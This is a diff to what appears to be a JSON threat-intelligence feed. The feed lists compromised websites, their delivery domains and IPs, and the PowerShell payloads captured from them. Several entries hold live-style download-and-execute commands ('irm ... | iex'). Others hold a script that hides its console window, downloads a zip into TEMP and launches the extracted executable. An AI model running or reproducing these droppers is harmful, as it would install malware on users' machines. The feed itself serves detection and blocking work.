@@ -1,5 +1,88 @@
 [
   {
+    "UrlDomain": "constelacioneselenaneira.es",
+    "DeliveryUrl": [
+      "img-codes-cloude.info"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "172.67.200.243"
+    ],
+    "Related": [
+      {
+        "Value": "https://img-codes-cloude.info/41d88dcc57a5f96c",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://img-codes-cloude.info/api.php?s=a3946e3ded820e3d2f02885bf63c8a3a176d58bb9403b402&amp;_v=29926231",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'img-codes-cloude[.]info/41d88dcc57a5f96c'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://img-codes-cloude.info/41d88dcc57a5f96c"
+    ],
+    "ReportId": "cmwvictk00ep70nmlz5fj9rod",
+    "ScannedAt": "2026-11-25T02:32:07.384000+00:00"
+  },
+  {
+    "UrlDomain": "techiesbuzz.com",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "162.241.123.168"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Franz.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"G4spHKbT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwvic5jb0enp0nmlyqy9objn",
+    "ScannedAt": "2026-11-25T02:31:36.239000+00:00"
+  },
+  {
+    "UrlDomain": "expertseedbank.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b8fd8c7cc531af4a"
+    ],
+    "IP": [
+      "141.193.213.10"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/b8fd8c7cc531af4a')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/b8fd8c7cc531af4a"
+    ],
+    "ReportId": "cmwvgde1d0elj0nmlvb8f17fw",
+    "ScannedAt": "2026-11-25T01:36:34.706000+00:00"
+  },
+  {
+    "UrlDomain": "coppkbr.ru",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a3d86f2e72d08c5e"
+    ],
+    "IP": [
+      "37.18.61.132"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/a3d86f2e72d08c5e')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/a3d86f2e72d08c5e"
+    ],
+    "ReportId": "cmwvgcc250ejp0nml79vyx8ba",
+    "ScannedAt": "2026-11-25T01:35:45.447000+00:00"
+  },
+  {
     "UrlDomain": "aga-pics.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -10851,79 +10934,5 @@
     ],
     "ReportId": "cmwk3p26p19uc0omlw8z2aok9",
     "ScannedAt": "2026-11-17T02:56:16.266000+00:00"
-  },
-  {
-    "UrlDomain": "dubaiicc.org",
-    "DeliveryUrl": [
-      "lovezramexar.info",
-      "makeverizyjar.info",
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "134.199.232.142"
-    ],
-    "Related": [
-      {
-        "Value": "https://lovezramexar.info/api.php?s=4a67ef89c0c750abf170c83e5a5922de63802862343d2c6b&amp;_v=29914667",
-        "Type": "Reference"
-      },
-      {
-        "Value": "https://makeverizyjar.info/api.php?s=9fee61d3c60417b2704fbe23c5b2abb636003abc2254fd89&amp;_v=29914667",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwk1atw219gr0oml6sk6cbtv",
-    "ScannedAt": "2026-11-17T01:49:13.081000+00:00"
-  },
-  {
-    "UrlDomain": "mnbarberstudio.com",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "78.142.208.11"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwk19p8v19fi0omldrlx19g0",
-    "ScannedAt": "2026-11-17T01:48:20.434000+00:00"
-  },
-  {
-    "UrlDomain": "igrowseo.com",
-    "DeliveryUrl": [
-      "lovezramexar.info",
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "65.109.111.76"
-    ],
-    "Related": [
-      {
-        "Value": "https://lovezramexar.info/api.php?s=4a67ef89c0c750abf170c83e5a5922de63802862343d2c6b&amp;_v=29914654",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwk0sutc19dk0omldqs77qbt",
-    "ScannedAt": "2026-11-17T01:35:14.437000+00:00"
   }
 ]
